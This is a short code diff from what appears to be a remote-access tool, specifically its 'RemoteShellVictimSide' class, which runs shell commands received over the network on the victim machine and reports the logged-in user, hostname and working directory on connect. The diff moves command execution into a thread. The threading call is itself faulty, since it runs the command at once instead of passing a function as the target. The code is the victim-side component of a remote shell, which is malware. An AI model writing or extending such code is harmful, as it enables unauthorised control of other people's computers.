@@ -1,5 +1,6 @@
 import os
 import subprocess
+import threading
 from glob import glob
 
 from src.modlues.protocols.general import GeneralPacket, GeneralPacketType
@@ -32,7 +33,7 @@ class RemoteShellVictimSide:
         if packet.packet_type == PacketType.REMOTE_SHELL.value:
             if packet.packet_sub_type == RemoteShellPacketType.COMMAND.value:
                 print(packet.payload.decode())
-                self.execute_and_capture(packet.payload.decode())
+                threading.Thread(target=self.execute_and_capture(packet.payload.decode())).start()
 
     def __connect(self):
         packet_payload = f'{os.getlogin()}@{os.uname()[1]} {self.__get_cwd()}'.encode()
